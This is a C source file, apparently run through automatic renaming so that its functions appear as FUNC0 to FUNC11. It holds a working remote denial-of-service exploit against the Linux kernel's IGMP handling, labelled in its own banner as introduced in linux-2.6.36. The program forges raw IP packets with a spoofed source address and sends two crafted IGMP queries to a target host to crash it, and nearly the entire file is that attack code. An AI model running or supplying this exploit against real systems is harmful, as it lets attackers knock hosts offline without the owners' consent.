#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {long s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int ihl; int version; int tot_len; int ttl; long saddr; long daddr; void* id; scalar_t__ options2; scalar_t__ options1; void* check; int /*<<< orphan*/  protocol; scalar_t__ frag_off; scalar_t__ tos; } ;
struct igmp_query {int type; int maxresponse; void* csum; void* mcast; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_IGMP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 void* FUNC2 (int) ; 
 void* FUNC3 (unsigned short*,int) ; 
 void* FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 long FUNC8 (char*) ; 
 int FUNC9 (int,char**,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int FUNC11(int argc, char *argv[])
{
  struct sockaddr_in dst;
  struct iphdr *ip;
  struct igmp_query *igmp;
  long daddr, saddr;
  int s, i=0, c, len, one=1;
  char buf[1500];


  if (argc < 3)
  {
    FUNC7("Linux IGMP Remote Denial Of Service (Introduced in linux-2.6.36)\n"
	   "credits to Ben Hutchings\nwritten by Kingcope\n"
	   "Ripped & modified code written by Firestorm\n");
    FUNC7("Usage: %s <src> <dst>\n", *argv);
    return(1);
  }


  daddr = FUNC8(argv[2]);
  saddr = FUNC8(argv[1]);

  FUNC5(buf, 0, 1500);
  ip = (struct iphdr *)&buf;
  igmp = (struct igmp_query*)&buf[sizeof(struct iphdr)];

  dst.sin_addr.s_addr = daddr;
  dst.sin_family = AF_INET;

  ip->ihl = 7;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = FUNC2(sizeof(struct iphdr)+8);
  ip->id = FUNC2(18277);
  ip->frag_off=0;
  ip->ttl = 1;
  ip->protocol = IPPROTO_IGMP;
  ip->check = FUNC3((unsigned short *)ip, sizeof(struct iphdr));
  ip->saddr = saddr;
  ip->daddr = daddr;
  ip->options1 = 0;
  ip->options2 = 0;
  igmp->type = 0x11;
  igmp->maxresponse = 0xff;
  igmp->mcast=FUNC4("224.0.0.1");

  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp->csum=FUNC3((unsigned short *)igmp, 8);

  s = FUNC10(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  FUNC7("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);

      if (FUNC9(s,&buf,sizeof(struct iphdr)+8,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
      {
        FUNC6("Error sending packet");
        FUNC1(-1);
      }

  FUNC0(s);

  s = FUNC10(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  ip->id = FUNC2(18278);
  ip->tot_len = sizeof(struct iphdr)+12;
  igmp->type = 0x11;
  igmp->maxresponse = 0;
  igmp->mcast=FUNC4("0.0.0.0");

  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp->csum=FUNC3((unsigned short *)igmp, 12);

  FUNC7("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);

      if (FUNC9(s,&buf,sizeof(struct iphdr)+12,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
      {
        FUNC6("Error sending packet");
        FUNC1(-1);
      }

  return(0);
}